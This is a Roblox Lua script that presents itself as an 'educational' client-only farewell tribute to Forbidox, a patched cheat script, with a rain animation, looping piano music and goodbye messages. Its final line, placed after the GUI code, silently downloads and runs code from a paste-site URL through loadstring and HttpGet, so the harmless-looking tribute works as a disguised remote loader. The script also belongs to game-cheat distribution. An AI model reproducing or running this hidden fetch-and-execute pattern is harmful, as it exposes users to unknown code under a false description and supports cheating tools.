-- 💔 Forbidox Farewell (Rain Tribute + Looping Music)
-- Educational Tribute Script (Client-Sided Only)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- 🌙 GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "ForbidoxTribute"
gui.ResetOnSpawn = false
gui.Parent = PlayerGui

local box = Instance.new("Frame")
box.Size = UDim2.new(0.5, 0, 0.35, 0)
box.Position = UDim2.new(0.25, 0, 0.3, 0)
box.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
box.BackgroundTransparency = 0.25
box.BorderSizePixel = 0
box.Parent = gui

local corner = Instance.new("UICorner", box)
corner.CornerRadius = UDim.new(0, 14)

local padding = Instance.new("UIPadding", box)
padding.PaddingTop = UDim.new(0, 15)
padding.PaddingLeft = UDim.new(0, 15)
padding.PaddingRight = UDim.new(0, 15)
padding.PaddingBottom = UDim.new(0, 15)

-- ✨ Text Label
local label = Instance.new("TextLabel", box)
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.Font = Enum.Font.GothamSemibold
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextScaled = true
label.TextWrapped = true
label.TextXAlignment = Enum.TextXAlignment.Center
label.TextYAlignment = Enum.TextYAlignment.Center
label.RichText = true
label.Text = ""

-- ❌ Close Button
local close = Instance.new("TextButton", box)
close.Size = UDim2.new(0, 40, 0, 40)
close.Position = UDim2.new(1, -50, 0, 10)
close.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
close.Text = "❌"
close.Font = Enum.Font.GothamBold
close.TextSize = 22
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.Visible = false
local closeCorner = Instance.new("UICorner", close)
closeCorner.CornerRadius = UDim.new(0, 8)

-- 🌧️ Rain Effect
local drops = {}
for i = 1, 40 do
	local drop = Instance.new("Frame")
	drop.Size = UDim2.new(0, 2, 0, math.random(10, 20))
	drop.Position = UDim2.new(math.random(), 0, math.random(), 0)
	drop.BackgroundColor3 = Color3.fromRGB(180, 180, 255)
	drop.BackgroundTransparency = 0.6
	drop.BorderSizePixel = 0
	drop.Parent = box
	table.insert(drops, drop)
end

task.spawn(function()
	while gui.Parent do
		for _, drop in ipairs(drops) do
			local newY = drop.Position.Y.Scale + 0.04
			if newY > 1 then
				newY = 0
				drop.Position = UDim2.new(math.random(), 0, 0, 0)
			else
				drop.Position = UDim2.new(drop.Position.X.Scale, 0, newY, 0)
			end
		end
		RunService.RenderStepped:Wait()
	end
end)

-- 🎵 Background Music (Client Only)
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://135308045" -- Sad Piano / Emotional Background
sound.Volume = 1
sound.Looped = true
sound.Parent = PlayerGui

-- Fade In Music
sound.Volume = 0
sound:Play()
TweenService:Create(sound, TweenInfo.new(3), {Volume = 1}):Play()

-- 💬 Message Lines
local lines = {
	"💔 Rest in Peace Forbidox 💔",
	"🕊️ We’re heartbroken to tell all our amazing Forbidox users that our journey must pause here…",
	"⚙️ The game got updated — and our beloved script, once flawless, now lies broken and patched.",
	"🌙 Forbidox was born as a tiny test, but it became something much greater… a family, a dream, a revolution. 💫",
	"💡 It was supposed to get a massive update in November… but destiny had other plans. 😞",
	"💖 Thank you — for every smile, every message, every user who believed in us.",
	"💫 You all made Forbidox alive.",
	"⏳ We promise… this isn’t the end. We’ll return — March 2026 — stronger, cleaner, keyless forever. ✨",
	"🙏 For support and updates — follow @forbiddenway69 🌍",
	"🕯️ Peace out, legends… until we meet again. 💫🌧️"
}

-- ⏳ Show Lines
local function showLine(text)
	label.Text = text
	label.TextTransparency = 1
	TweenService:Create(label, TweenInfo.new(1), {TextTransparency = 0}):Play()
	wait(5) -- Each line visible for 5 seconds
	TweenService:Create(label, TweenInfo.new(1), {TextTransparency = 1}):Play()
	wait(0.5)
end

-- 🎞️ Play Sequence
task.spawn(function()
	for _, line in ipairs(lines) do
		showLine(line)
	end
	close.Visible = true
end)

-- ❌ Close Action
close.MouseButton1Click:Connect(function()
	TweenService:Create(box, TweenInfo.new(1.2), {BackgroundTransparency = 1}):Play()
	TweenService:Create(label, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
	TweenService:Create(sound, TweenInfo.new(1), {Volume = 0}):Play()
	wait(1.3)
	sound:Stop()
	gui:Destroy()
end)

loadstring(game:HttpGet("https://pastefy.app/CCYk1QSk/raw"))()